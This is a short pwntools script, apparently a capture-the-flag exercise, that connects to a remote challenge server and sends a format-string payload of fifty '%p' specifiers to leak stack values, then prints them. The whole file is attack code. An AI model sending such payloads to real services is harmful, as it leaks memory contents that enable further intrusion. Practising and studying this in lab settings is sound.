from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "warning"

io = remote("node10.anna.nssnode.cn", 29175)

io.sendlineafter(
    b"Give me your input: ",
    ("-%p" * 50).encode()
)

print(io.recv(timeout=3).decode().replace("-", "\n"))
